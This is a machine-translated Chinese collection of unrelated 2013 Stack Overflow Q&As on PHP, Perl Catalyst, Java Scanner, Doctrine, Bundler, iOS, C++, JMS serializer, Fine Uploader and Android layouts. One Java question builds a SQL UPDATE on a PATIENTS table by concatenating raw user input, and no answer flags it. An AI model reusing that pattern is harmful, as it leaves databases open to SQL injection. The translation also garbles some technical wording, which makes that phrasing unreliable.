好吧，我已经向您*展示了如何*做到这一点，但我真的不明白您*为什么*要这样做。如果您的用户看到带有文本的链接，暗示该链接会将他们带到 Facebook，并且该链接实际上会将他们带回您的主页，他们会感到恼火，并且不会再使用您的网站。

# php - 通过正则表达式 (PHP) 删除邮件中的完整引号

> ID：15443361
> 
> 赞同：0
> 
> 时间：2013-03-15T22:52:18.930
> 
> 标签：php, regex, email

我正在尝试删除电子邮件中的引号。如果用户对该邮件进行答复并在一个块中引用整封邮件，我已将数据库中该对话的其他邮件保存为解析的 HTML（因为它被发送给用户），我想删除完整引用。

但是有一个问题。每个邮件客户端都以自己的风格标记报价。Google 使用 blockquote，apple cite，一些 webmails 使用 div 并且很好 - 还有纯文本，其中引用标有“>”

我现在要做的是删除引用，如果它引用了先前答案之一的全文。

我正在使用 PHP

# perl - url语言前缀的催化剂最佳方式？

> ID：15443363
> 
> 赞同：4
> 
> 时间：2013-03-15T22:52:25.013
> 
> 标签：perl, internationalization, multilingual, catalyst

我已经为现有站点以多种语言完成了所有 I18N 和 GetText 操作。

对于选择一种或另一种语言，似乎在 URL 前加上 www.domain.com/ **fr_FR** /my_action 或 www.domain.com/ **de_DE** /my_action 之类的路径部分是最好的选择，或者 Google 友好的网站。

我找到了这个模块：[Catalyst-Plugin-I18N-PathPrefix](http://search.cpan.org/~mendel/Catalyst-Plugin-I18N-PathPrefix-0.07/lib/Catalyst/Plugin/I18N/PathPrefix.pm)似乎是基于这篇[出现的文章](http://dev.catalystframework.org/wiki/wikicookbook/urlpathprefixing)

在 Catalyst 中执行此操作是否正确（或当前最佳实践）？

它保证我不需要更改我的操作、我需要的参数和 URL。

或者这个插件/技术使服务器过载，我可以更好地避免手动重写我的所有网址？

问候：米格

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T15:37:32.467

是否是相同的资源，只是`www.domain.com/fr_FR/my_action`用**不同**的语言表示？或者您的用户是否会根据他们选择的语言看到不同的内容（例如，我不知道，不同的新闻）？`www.domain.com/de_DE/my_action`

 **如果第一个问题的答案是肯定的，我宁愿去实现`Accept-language`标头合规性，例如使用[I18N::AcceptLanguage](http://search.cpan.org/~cgilmore/I18N-AcceptLanguage-1.04/)，它的额外好处是它不会以任何方式干扰您设计 URL 的方式。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-05-06T16:21:50.933

我冒险并实施了 Catalyst-Plugin-I18N-PathPrefix 插件。这很容易，而且服务器负载（这是我主要关心的）似乎并不明显。

可以说...在关注插件性能之前，我应该花时间优化我自己的代码的很多东西。

还是非常感谢。**

# java - 扫描仪拾取垃圾值？

> ID：15443366
> 
> 赞同：0
> 
> 时间：2013-03-15T22:52:57.660
> 
> 标签：java, java.util.scanner

我正在开发一个菜单驱动的程序，该程序带有用户想要做的数字选项。输入后`2`，用户可以通过输入新地址来更新他们的地址，如下所示：

```
if (edit == 2) {
    System.out.print("Please enter your new address: ");
    String address = in.nextLine();
    stmt.executeUpdate("UPDATE PATIENTS " +
        "SET ADDRESS = '" + address + "' " +
        "WHERE LOGIN = '" + username + "'");
} 
```

我遇到的问题是，一旦用户输入选项`2`，他们就永远无法尝试输入他们的地址，因为程序认为输入了一个空值，然后尝试在数据库上执行更新语句，但由于地址不能是`NULL`。

是否有理由拾取我丢失的垃圾值？对于用户尝试使用`in.next()`and编辑其姓名、年龄等的其他选项，它似乎可以正常工作`in.nextInt()`。无论出于何种原因，`in.nextLine()`默认为`NULL`在用户有机会输入任何内容之前。

我试过`String trash = in.next();`在阅读之前写一条线`in.nextLine()`。这会阻止程序崩溃，但会切断地址的数字部分。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-15T23:11:31.367

您可能正在使用`in.nextInt()`来检索`edit`. 当您这样做时，输入流上仍然会有一个换行符 ( `\n`)，因此您的调用`in.nextLine()`是检索该换行符。其他方法将忽略空格，因此它们会使用换行符，并且它们会按预期工作。

如果您调用`in.nextLine()`两次，第二次调用将返回您要查找的行。或者，您可能希望`in.nextLine()`在检索`edit`值并从那里解析整数时调用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-15T23:34:45.747

试着把这个

```
in.skip("\r\n|[\n\r\u2028\u2029\u0085]"); 
```

就在上面

```
in.nextLine(); 
```

这应该可以防止您跳过输入，并且如果您使用任何类型的循环也会很好，因为有时额外的 in.nextLine() 会引起头痛。

# mysql - 带有 Symfony2 的 Doctrine2：为什么级联持续在这种多对多关系上不起作用？

> ID：15443375
> 
> 赞同：0
> 
> 时间：2013-03-15T22:53:45.783
> 
> 标签：mysql, symfony, doctrine-orm, many-to-many, cascade

在我的项目中，我有很多`many-to-many`实体。这种`many-to-many`关系有属性，所以我决定`A 1:n B n:1 C`像[这篇文章中描述的](https://stackoverflow.com/questions/3542243/doctrine2-best-way-to-handle-many-to-many-with-extra-columns-in-reference-table)那样把它们分开。

所以我的简化类结构如下所示。到目前为止一切顺利，但是当我运行我的控制器（也在下面列出）来插入值时，我遇到了一个异常：

> 使用参数 {...} 执行“INSERT INTO b (...) VALUES (...)”时发生异常
> 
> SQLSTATE [23000]：违反完整性约束：1048 列 'class_a_id' 不能为空

我究竟做错了什么？

### A级

```
<?
/**
 * @ORM\Entity
 * @ORM\Table(name="a")
 */
class ClassA {
    /**
     * @ORM\Id
     * @ORM\Column(type="integer")
     * @ORM\GeneratedValue(strategy="AUTO")
     **/
    protected $id;

    /** OTHER FIELDS **/

    /**
     * @ORM\OneToMany(targetEntity="ClassB", mappedBy="class_a", cascade={"persist", "remove"})
     **/
    protected $class_b;
} 
```

### B类

```
/**
 * @ORM\Entity
 * @ORM\Table(name="b")
 */
class ClassB {
    /**
     * @ORM\Id
     * @ORM\Column(type="integer")
     * @ORM\GeneratedValue(strategy="AUTO")
     **/
    protected $id;
    /**
     * @ORM\ManyToOne(targetEntity="ClassC", inversedBy="class_b")
     * @ORM\JoinColumn(name="class_c_id", referencedColumnName="id", nullable=false)
     **/
    protected $class_c;
    /**
     * @ORM\ManyToOne(targetEntity="ClassA", inversedBy="class_b")
     * @ORM\JoinColumn(name="class_a_id", referencedColumnName="id", nullable=false)
     **/
     protected $class_a;

    /** OTHER FIELDS **/
} 
```

### C类

```
/**
 * @ORM\Entity
 * @ORM\Table(name="c")
 */
class ClassC {
    /**
     * @ORM\Id
     * @ORM\Column(type="integer")
     * @ORM\GeneratedValue(strategy="AUTO")
     */
    protected $id;

    /** OTHER FIELDS **/

    /**
     * @ORM\OneToMany(targetEntity="ClassB", mappedBy="class_c")
     **/
    protected $class_b;
} 
```

### 控制器

```
$em = $this->getDoctrine()->getEntityManager();
$a = new ClassA();
$a->setXXX() //Setting some other fields
foreach(...) {
    $b = new ClassB();
    $b->setClass_C(...); //found by doctrine out of database and set into classB
    $b->setXXX() //Setting some other fields
    $a->addClass-B($b); //added ClassB into ClassA
}
$em->persist($a);
$em->flush(); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-15T23:40:03.550

感谢您考虑我的问题，但已经解决了！只需将 a 类添加到 b 中即可轻松解决该问题。所以我的控制器现在可以工作了。请参阅下面的区别：

### 控制器

```
$em = $this->getDoctrine()->getEntityManager();
$a = new ClassA();
$a->setXXX() //Setting some other fields
foreach(...) {
    $b = new ClassB();
    $b->setClass_C(...); //found by doctrine out of database and set into classB
    $b->setXXX() //Setting some other fields
    $a->addClass-B($b); //added ClassB into ClassA
    $b->setClass_A($a); //add ClassA into Class B !!NEW!!
}
$em->persist($a);
$em->flush(); 
```

# java - 扫描仪 NoSuchElementException

> ID：15443383
> 
> 赞同：9
> 
> 时间：2013-03-15T22:55:06.720
> 
> 标签：java, exception, java.util.scanner

我的 Java 作业有问题。我遇到了一个意外的异常，特别是：

> java.util.NoSuchElementException：找不到行

我正在使用`Scanner(System.in)`并且程序不断读取任何内容并重复“无效格式”异常文本。如果我输入一个正确的值`int`，第一部分通过，然后该`double`部分立即进入这个异常。如果我输入了一个不正确的值`int`，那么它就会开始循环异常。

这是我的代码：

```
import java.util.Scanner;

public class Program_4 {

    public static void main(String[] args) {
        getValidInt("Enter an integer from 5 to 50",5,50);
        getValidDouble("Enter a double from 5.0 to 50.0",5.0,50.0);
        getValidString("Enter a string with length from 5 to 8 characters",5,8);
    }

    public static int getInt(String prompt)
    {
       Scanner sc = new Scanner(System.in);
       int i = 0;
       boolean isValid;
       do
       {
          try
          {
             System.out.print(prompt + ": ");
             i = Integer.parseInt(sc.nextLine());
             isValid = true;
          } 
          catch (Exception e)
          {
              System.out.println(e);
              System.out.print("Invalid Format: ");
              isValid = false;
          }
       }
       while (isValid == false);
       sc.close();
       return i;
    }

    public static int getValidInt(String prompt, int min, int max)
    {
        int i = 0;
        boolean isValid = false;
        do
        {
            i = getInt(prompt);
            if(i < min) System.out.println("Value must be >= " + min);
            else if(i > max) System.out.println("Value must be <= " + max);
            else isValid = true;
        } while (isValid == false);

        return i;
    }

    public static double getDouble(String prompt)
    {
       Scanner sc = new Scanner(System.in);
       double i = 0.0;
       boolean isValid;
       do
       {
          try
          {
             System.out.print(prompt + ": ");
             i = Double.parseDouble(sc.nextLine());
             isValid = true;
          } 
          catch (Exception e)
          {
              System.out.println(e);
              System.out.println("Invalid Format: ");
              isValid = false;
          }
       } while (isValid == false);
       sc.close();
       return i;
    }

    public static double getValidDouble(String prompt, double min, double max)
    {
        int i = 0;   
        boolean isValid = false;
        do
        {
            i = getInt(prompt);
            if(i < min) System.out.println("Value must be >= " + min);
            else if(i > max) System.out.println("Value must be <= " + max);
            else isValid = true;
        } while (isValid == false);

        return i;
    }

    public static String getString(String prompt)
    {
       Scanner sc = new Scanner(System.in);
       String i="";
       boolean isValid;
       do
       {
          try
          {
             System.out.print(prompt + ": ");
             i = sc.nextLine();
             isValid = true;
          } 
          catch (Exception e)
          {
              System.out.print("Invalid Format: ");
              isValid = false;
          }
       } while (isValid == false);
       sc.close();
       return i;
    }

    public static String getValidString(String prompt, int min, int max)
    {
        String i;
        boolean isValid = false;

        do
        {
            i = getString(prompt);
            if(i.length() < min) System.out.println("String must be more than "       + min + " characters.");
            else if(i.length() > max) System.out.println("String must be more     than " + max + " characters.");
            else isValid = true;
        } while (isValid == false);

        return i;
    }
} 
```

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2013-03-15T23:08:47.447

您关闭的不止一个`Scanner`，它关闭了底层`InputStream`，因此另一个`Scanner`不能再从相同`InputStream`的`NoSuchElementException`结果中读取。

对于控制台应用程序，请使用单个`Scanner`从`System.in`.

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-15T23:06:51.387

由于您在捕获异常的所有三个地方都打印出相同的消息，因此很难确定发生了什么：

*   用于`printStackTrace()`找出异常发生的位置

*   不要这样抓`Exception`。捕获您所期望的以及您的代码旨在处理的异常。如果你捕捉`Exception`到了，你最终可能会捕捉到各种*意外*异常（NPE、文件结尾等）......并将它们**错误地**报告为“无效格式”。

# ruby - 根据 ruby 版本捆绑不同版本的开发 gem

> ID：15443386
> 
> 赞同：0
> 
> 时间：2013-03-15T22:55:21.670
> 
> 标签：ruby, bundler, versioning

我有一个依赖于`flexmock`. 出于多种原因，我希望这个应用程序在 1.8.7 到 2.0.0 及更高版本上运行，到目前为止它运行得非常好。由于该应用程序具有庞大的测试套件，因此很容易保持兼容性。

唯一的问题是`flexmock`。旧版本的 flexmock 中有一个错误，我必须使用猴子补丁来解决。较新版本的 flexmock 修复了该错误，但它仅适用于 1.9.3。我使用的较旧版本的 flexmock 在 2.0.0 上也会导致测试失败，因为它错误地记录了诸如 Time 之类的方法调用的数量。

是否有一个神奇的 Bundler 咒语，我可以使用它来修改我的开发依赖项，以便它们为我运行的每个 Ruby 版本提供相关版本？特别是让它在 Travis-Ci 上运行干净？

我没有版本控制`Gemfile.lock`

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-15T23:12:39.590

你应该把你的`flexmock`版本放在组中，然后当你`bundle install`可以排除你不想要的组时，所以：

```
group :ruby18 do 
   gem 'flexmock', ~> oldversion
end

groups :ruby19 do
   gem 'flexmock', ~> newversion
end 
```

然后当您在 1.8 中运行该应用程序时，您可以`bundle install --without ruby19`在 ruby​​ 1.9+ 中反之亦然。[在http://gembundler.com/v1.3/groups.html](http://gembundler.com/v1.3/groups.html)上查看更多信息

# iphone - UITableView 不会重新加载 contentSize

> ID：15443388
> 
> 赞同：3
> 
> 时间：2013-03-15T22:55:35.827
> 
> 标签：iphone, ios, tableview, reload

我有一个 UITableView，它在 UITableView 第一次重新加载后添加了一些数据，但是如果我滚动看到新数据，我无法向下滚动到新数据，但是它会自动回滚，是的，我重新加载了我的 UITableView ，所以我检查了我的 UITableView contentSize 并且在重新加载后它不会改变，但是在我转到另一个视图（UINavigationController）并弹回 UITableView contentSize 确实改变并且它工作之后！我怎样才能解决这个问题？

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-10-27T21:58:06.327

我有一个类似的问题，并使用与 Daan 相同的技术解决了它（据我所知）。

在我的例子中，我使用了一个静态 UITableView，它最初隐藏了一些行和部分（通过从`numberOfSectionsInTableView:`和设置适当的返回值`tableView:numberOfRowsInSection:`）。我将 VC 推送到导航堆栈以收集其他数据，然后我将使用这些数据填充隐藏的 tableview 部分，在 tableview 上调用 reloadData 以刷新它。

这在 iOS7 中运行良好，但在 iOS6 中，tableview`contentSize.height`从未从其初始值 (218 pts) 更改为由于添加新部分而获得的更高值 (504 pts)。因此，您无法滚动到 tableview 底部的内容。尝试强制 contentSize 不起作用，因为它立即设置回 218。

更改 tableView`contentOffset`允许我滚动到内容的底部，但如果您点击最后一个单元格中的 UITextField，它会在显示键盘时从屏幕上跳出。

我终于能够想出一个在 iOS6 和 iOS7 中都能正常工作的解决方案。我使用了UITableView的旧`beginUpdates`/插入或删除行和部分/`endUpdates`方法，如下：

```
// change the tableView's data source to reflect insertions/deletions
[self.tableView beginUpdates];
[self.tableView deleteRowsAtIndexPaths:@[ [NSIndexPath indexPathForRow:1 inSection:0] ] withRowAnimation:UITableViewRowAnimationAutomatic];
[self.tableView insertSections:[NSIndexSet indexSetWithIndexesInRange:NSRangeFromString(@"1,3")] withRowAnimation:UITableViewRowAnimationAutomatic];
[self.tableView endUpdates]; 
```

如您所见，在这种特殊情况下，我必须从第一个（也是唯一一个）部分中删除一行，并将三个部分添加到 tableview 的末尾。

# c++ - 指针的初始化

> ID：15443400
> 
> 赞同：5
> 
> 时间：2013-03-15T22:57:00.293
> 
> 标签：c++

我目前对以下语句感到困惑-尽管此语句会在编译时产生错误，但事实并非如此。

```
// statement 1:
someclass* q(someclass()); 
```

我明白如果声明是这样的

```
// statement 2:
someclass* q(&someclass()); 
```

我想知道为什么语句 1 不会产生错误，或者即使它是有效的（我在幕后遗漏了什么？）

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2013-03-15T22:59:40.910

> 我想知道为什么语句 1 不会产生错误，或者即使那是有效的

第一条语句是有效的，尽管它可能没有按照您的预期执行：该语句声明了一个名为的*函数*`q`，该函数返回一个指向类型对象的指针，`someclass`并接受输入一个函数，该函数又不接受任何参数并返回一个类型的对象`someclass`. 这被称为[**最令人烦恼的解析**](http://en.wikipedia.org/wiki/Most_vexing_parse)。

第二条语句无效：它试图声明一个指向`q`类型为 的对象的`someclass`指针，并将该指针初始化为由`someclass()`表达式构造的对象的地址。但是请注意，这`someclass()`是一个*临时*的，并且使用临时地址是非法的。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-15T22:59:33.920

语句 1 实际上是一个函数的声明。这个函数被调用`q`，它接受一个指向不带参数并返回一个函数的`someclass`指针，并返回一个指向 的指针`someclass`。

请参阅[最令人烦恼的解析](http://en.wikipedia.org/wiki/Most_vexing_parse)。

# php - 为什么在 Symfony2 中找不到我的 SerializerBuilder？

> ID：15443407
> 
> 赞同：1
> 
> 时间：2013-03-15T22:57:33.553
> 
> 标签：php, symfony, jmsserializerbundle

我正在尝试使用`JMSSerializerBuilder`json 对我的对象进行编码，以便能够进行 AJAX 调用。

我已经通过composer成功安装了这个包。

然后，按照[官方文档](http://jmsyst.com/libs/serializer)，我正在做：

```
<?php

namespace Pondip\GeolocBundle\Controller;

use Symfony\Bundle\FrameworkBundle\Controller\Controller;
use Symfony\Component\HttpFoundation\Response;
use JMS\Serializer\SerializerBuilder;   

class DefaultController extends Controller
{
    public function getLakesSurroundingAction($lat=0, $lng=0, $limit = 50, $distance = 50, $unit = 'km')
    {
        $lakesNearby= $this->getNearby($lat, $lng, $limit, $distance, $unit);
        $serializer = JMS\Serializer\SerializerBuilder::create()->build();
        $return = $serializer->serialize($return, 'json');
    }

} 
```

但它返回

> 致命错误异常：
> 
> 错误：在 C:\Program Files (x86)\wamp\www\Pondip Dev\src\Pondip\GeolocBundle\Controller\DefaultController.php 第 51 行中找不到类 'Pondip\GeolocBundle\Controller\JMS\Serializer\SerializerBuilder'

第 51 行是：

```
$serializer = JMS\Serializer\SerializerBuilder::create()->build(); 
```

为什么会这样？删除该`use JMS\Serializer\SerializerBuilder;`行时（因为文档中未指定），我只收到内部服务器错误。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-15T23:01:26.290

就位后，`use JMS\Serializer\SerializerBuilder;`您应该像`SerializerBuilder`. 没有它，使用完全限定名称`\JMS\Serializer\SerializerBuilder`（注意前导反斜杠！）

进一步参考：[http ://www.php.net/manual/en/language.namespaces.basics.php](http://www.php.net/manual/en/language.namespaces.basics.php)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-15T23:03:16.900

那是因为您没有正确使用命名空间。使用语句为特定命名空间生成别名。该`use JMS\Serializer\SerializerBuilder;`语句意味着这`SerializerBuilder`是`JMS\Serializer\SerializerBuilder`该类的别名。

在您的代码中执行`$serializer = JSM\Serializer\SerializerBuilder::create()`时，它是一个非限定名称空间，这意味着它会进入当前名称空间。这意味着 PHP 正在搜索 a `Pondip\GeolocBundle\Controller\JMS\Serializer\SerializerBuilder`（就像您在`Pondip\GeolocBundle\Controller\`命名空间中一样）。

要解决此问题，只需使用`$serializer = SerializerBuilder::create()`. 因为我们已经为 设置了别名`SerializerBuilder`，所以它会进入正确的类并且一切正常。

有关更多信息，请查看一些“PHP 命名空间”教程，例如[这个](http://phpmaster.com/php-namespaces/)。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-10T14:52:19.177

我个人不得不使用`$this->container->get('serializer');`而不是`$serializer = $container->get('jms_serializer');`

# javascript - 检测最后一个文件何时完成上传？

> ID：15443410
> 
> 赞同：1
> 
> 时间：2013-03-15T22:58:07.357
> 
> 标签：javascript, jquery, fine-uploader

我正在使用[精细上传](https://github.com/Widen/fine-uploader)器来处理我拥有的 Web 应用程序中的文件上传。最后一个文件完成处理时是否有某种回调？我找到了`onComplete`回调，但是当每个文件完成时都会触发它。我需要知道*所有*文件何时完成。有谁知道用精美的上传器做到这一点的方法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-17T15:50:49.137

我认为优秀的上传器无法提供您所要求的内容，但您自己很容易做到这一点。您可以在 onSubmit 回调中增加一个计数，并在 onComplete 回调中减少它。当 onComplete 中的计数达到 0 时，表示所有文件都已处理完毕。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-18T18:37:19.703

最终走这条路：

```
 var uploader = $("#upload").fineUploader({
            request: {
                endpoint: postUrl
            },
            template: uploadTemplate
        }).on('submit',function(){
            fileCount++;
        }).on('complete', function (event, id, name, responseJSON) {

            fileCount--;
            if(fileCount == 0){
                     alert("done!");
            }
        }); 
```

# android - 如何在Android中均匀分布单选按钮？

> ID：15443411
> 
> 赞同：29
> 
> 时间：2013-03-15T22:58:08.557
> 
> 标签：android, radio-button, radio-group, cellspacing

我有三个单选按钮，我想将它们均匀地分布在屏幕上。当我使用`android:layout_weight="1"`时，按钮会在屏幕上展开。那么，如何在它们之间拥有相同数量的空间，并且可以在不同的屏幕尺寸上进行缩放？

```
<RadioGroup 
        android:id="@+id/auton_bar"
        android:layout_width="fill_parent"
        android:layout_height="wrap_content"
        android:orientation="horizontal"
        android:paddingLeft="10dp"
        android:layout_below="@id/clear_fields"
                >
        <RadioButton
            android:id="@+id/auton_radio_1"
            android:layout_height="wrap_content"
            android:layout_width="wrap_content" 
            android:background="@drawable/auton_col"
            android:layout_weight="1"

            />
        <!-- android:layout_marginRight="380dp"  --> 
        <RadioButton
            android:id="@+id/auton_radio_2"
            android:layout_height="wrap_content"
            android:layout_width="wrap_content" 
            android:background="@drawable/auton_col"
            android:layout_weight="1"

            />
        <RadioButton
            android:id="@+id/auton_radio_3"
            android:layout_height="wrap_content"
            android:layout_width="wrap_content" 
            android:background="@drawable/auton_col"
            android:layout_weight="1"
            />

    </RadioGroup> 
```

* * *

## 回答 #1

> 赞同：51
> 
> 时间：2013-03-15T23:06:41.453

如果您希望它们平均共享屏幕宽度，则需要`android:layout_width="match_parent"`在每个`View`. 您的 xml 将变为：

```
<RadioGroup
    android:id="@+id/auton_bar"
    android:layout_width="match_parent"
    android:layout_height="wrap_content"
    android:layout_below="@id/clear_fields"
    android:orientation="horizontal"
    android:paddingLeft="10dp" >

    <RadioButton
        android:id="@+id/auton_radio_1"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:layout_weight="1"
        android:background="@drawable/auton_col" />
    <!-- android:layout_marginRight="380dp" -->

    <RadioButton
        android:id="@+id/auton_radio_2"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:layout_weight="1"
        android:background="@drawable/auton_col" />

    <RadioButton
        android:id="@+id/auton_radio_3"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:layout_weight="1"
        android:background="@drawable/auton_col" />
</RadioGroup> 
```

细说，`layout_weight`可以用两种方式。

*   如果您在垂直线性布局中有多个视图，并且您希望最后一个占据所有剩余空间，您可以将它们的高度设置为`wrap_content`并将最后一个视图的权重设置为 1。
*   如果您希望所有视图共享可用空间，请将所有宽度/高度设置为`0dp`or`match_parent`并为每个视图赋予相同的权重值。他们将平等地共享空间。

要让您的背景可绘制比例，请在您的文件夹中创建一个新的 xml，`drawable/`如下所示

```
<?xml version="1.0" encoding="utf-8"?>
<bitmap xmlns:android="http://schemas.android.com/apk/res/android"
    android:gravity="center"
    android:src="@drawable/auton_col" /> 
```

将它命名为您喜欢的任何名称（例如 auton_col_scale.xml）并将该可绘制对象作为您的背景。

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2017-12-05T23:45:00.233

我注意到对 RadioButton 使用布局权重会导致它们偏离中心对齐，尽管它们确实每个共享 50% 的屏幕（它们是左对齐的）。为每个 RadioButton 设置重力只会导致文本居中 /facepalm

下面的 XML 显示了如何水平对齐两个单选按钮（可以是任何视图）并将它们居中：

```
 <RadioGroup
                    android:id="@+id/radiogroup"
                    android:layout_width="match_parent"
                    android:layout_height="wrap_content"
                    android:orientation="horizontal">

                    <Space
                        android:layout_width="wrap_content"
                        android:layout_height="wrap_content"
                        android:layout_weight="1"/>

                    <RadioButton
                        android:id="@+id/radioyes"
                        android:layout_width="wrap_content"
                        android:layout_height="wrap_content"
                        android:text="@string/yes"
                        android:checked="false"/>

                    <Space
                        android:layout_width="wrap_content"
                        android:layout_height="wrap_content"
                        android:layout_weight="1"/>

                    <RadioButton
                        android:id="@+id/radiono"
                        android:layout_width="wrap_content"
                        android:layout_height="wrap_content"
                        android:text="@string/no"
                        android:checked="false"/>

                    <Space
                        android:layout_width="wrap_content"
                        android:layout_height="wrap_content"
                        android:layout_weight="1"/>

                </RadioGroup> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2020-12-24T10:19:54.133

设置宽度以匹配每个布局的父级，然后像线性布局一样添加权重jsut。

```
<RadioGroup
            android:id="@+id/radio_group"
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:layout_marginStart="@dimen/bigMarginStart"
            android:layout_marginTop="@dimen/smallMarginTop"
            android:layout_marginEnd="@dimen/baseMarginEnd"
            android:orientation="horizontal"
            android:weightSum="3"
            app:layout_constraintStart_toStartOf="parent"
            app:layout_constraintTop_toTopOf="parent">

            <RadioButton
                android:id="@+id/all_"
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:layout_marginTop="@dimen/smallMarginTop"
                android:layout_weight="1"
                android:background="@drawable/radio_flat_selector"
                android:button="@android:color/transparent"
                android:checked="true"
                android:gravity="center"
                android:paddingLeft="@dimen/bigPaddingStart"
                android:paddingTop="@dimen/smallPaddingTop"
                android:paddingRight="@dimen/bigPaddingStart"
                android:paddingBottom="@dimen/smallPaddingBottom"
                android:text="All" />

            <RadioButton
                android:id="@+id/future_"
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:layout_marginStart="@dimen/smallMarginStart"
                android:layout_marginTop="@dimen/smallMarginTop"
                android:layout_marginEnd="@dimen/smallMarginEnd"
                android:layout_weight="1"
                android:background="@drawable/radio_flat_selector"
                android:button="@android:color/transparent"
                android:gravity="center"
                android:paddingLeft="@dimen/bigPaddingStart"
                android:paddingTop="@dimen/smallPaddingTop"
                android:paddingRight="@dimen/bigPaddingStart"
                android:paddingBottom="@dimen/smallPaddingBottom"
                android:text="Future" />

            <RadioButton
                android:id="@+id/direct_"
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:layout_marginTop="@dimen/smallMarginTop"
                android:layout_weight="1"
                android:background="@drawable/radio_flat_selector"
                android:button="@android:color/transparent"
                android:gravity="center"
                android:paddingLeft="@dimen/bigPaddingStart"
                android:paddingTop="@dimen/smallPaddingTop"
                android:paddingRight="@dimen/bigPaddingStart"
                android:paddingBottom="@dimen/smallPaddingBottom"
                android:text="Direct" />

        </RadioGroup> 
```

# ruby - Ruby Oj 解析器内存问题

> ID：15443413
> 
> 赞同：2
> 
> 时间：2013-03-15T22:58:16.543
> 
> 标签：ruby, json, parsing, ubuntu

我一直在从事一个项目，该项目基本上将一些 json 数据转换为 ruby​​ 对象以执行一些任务。任务方面还可以，我在使用 json 解析器时遇到了一些问题。

Ruby OJ 是解析器引擎。从我的 couchdb 解析不超过 1000 个用户数据时，它工作得很好，但是当它超过 4000 时，它开始泄漏内存，我的 ubuntu 服务器只是杀死了 ruby​​ 进程。

我在这里没有选择。我只执行了软件的这一部分来测试它的性能，并发现解析器本身导致了这个问题。代码只是一个**Oj.load(json)**，每个用户至少可以有 100 行，最多 9000 行 json 数据。是不是太多了？

我正在测试 ruby​​ 1.9.2 和 1.9.3。

关于我做错了什么的任何线索？

提前致谢，

# android - 在 Android 应用中添加带边框的动态 TableLayout

> ID：15443414
> 
> 赞同：7
> 
> 时间：2013-03-15T22:58:18.753
> 
> 标签：android, android-layout, border, tablelayout

我正在创建一个 Android 应用程序。此 Android 应用程序将具有动态对象。这些对象是具有地址或纬度/经度、与当前位置的距离以及预计到达时间的地点。我想做的是在`TableLayout`带有边框的对象上添加对象，但我需要能够随着位置数量的增加而动态添加行。

我有点了解如何为 xml 上固定的硬编码项目数量执行此操作，但是当对象数量来自 Activity.java 文件时，最好的方法是什么？

下面是`TableLayout`我想要的截图：

![表格布局](../Images/c01af158f00e3545e66a839868d35fe6.png)

所以对象将是一个有地址、距离和方向的地方。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-03-18T20:51:41.370

> 但我需要能够随着地方数量的增加而动态添加行。

这并不难，当您有一个新对象将`TableRow`带有数据的 a 附加到`TableLayout`.

> 我有点了解如何为 xml 上固定的硬编码项目数量执行此操作，但是当对象数量来自 Activity.java 文件时，最好的方法是什么？

我认为没有最好的方法（或者你认为最好的方法）。你要么：

*   插入虚假视图作为分隔符。这在视觉上更容易实现，但也会增加应用程序的内存消耗，如果行数很大，则会产生不良后果。*(1)*
*   或者使用可绘制的背景来模拟边界（如九个补丁图像）。这会比插入额外的视图更简单，但你需要更多的天赋才能让它看起来很好。*(2)*

您的图像的一些示例：

**(1)**

```
private static final int DIVIDER_SIZE = 2;

// rowsCount the number of rows to add to the TableLayout
private void buildOldSchool(TableLayout table, int rowsCount) {
    View divider;
    for (int i = 0; i < rowsCount; i++) {
        TableRow row = new TableRow(this);
        for (int j = 0; j < 7; j++) {
            if (j % 2 == 0) {
                divider = new View(this);
                divider.setLayoutParams(new TableLayout.LayoutParams(
                        DIVIDER_SIZE, TableLayout.LayoutParams.MATCH_PARENT));
                divider.setBackgroundColor(Color.GREEN);
                row.addView(divider, new TableRow.LayoutParams(
                        DIVIDER_SIZE, TableRow.LayoutParams.MATCH_PARENT));
                continue;
            }
            TextView tv = new TextView(this);
            tv.setText("DX"); // dummy data
            row.addView(tv, new TableRow.LayoutParams(
                    TableRow.LayoutParams.MATCH_PARENT,
                    TableRow.LayoutParams.WRAP_CONTENT));
        }
        divider = new View(this);
        divider.setLayoutParams(new TableLayout.LayoutParams(
                TableLayout.LayoutParams.MATCH_PARENT, DIVIDER_SIZE));
        divider.setBackgroundColor(Color.GREEN);
        if (i == 0) {
            table.addView(divider);
            divider = new View(this);
            divider.setLayoutParams(new TableLayout.LayoutParams(
                    TableLayout.LayoutParams.MATCH_PARENT, DIVIDER_SIZE));
            divider.setBackgroundColor(Color.GREEN);
        }
        table.addView(row);
        table.addView(divider);
    }
} 
```

**(2)**或带图像：

```
private void buildWithDrawables(TableLayout table, int rowsCount) {
    for (int i = 0; i < rowsCount; i++) {
        TableRow row = new TableRow(this);
        row.setBackgroundResource(i == 0 ? R.drawable.firstrow
                : R.drawable.normalrow);
        for (int j = 0; j < 3; j++) {
            TextView tv = new TextView(this);
            tv.setBackgroundResource(j == 2 ? R.drawable.extra
                    : R.drawable.cell);
            tv.setText("DX");
            row.addView(tv, new TableRow.LayoutParams(
                    TableRow.LayoutParams.MATCH_PARENT,
                    TableRow.LayoutParams.WRAP_CONTENT));
        }
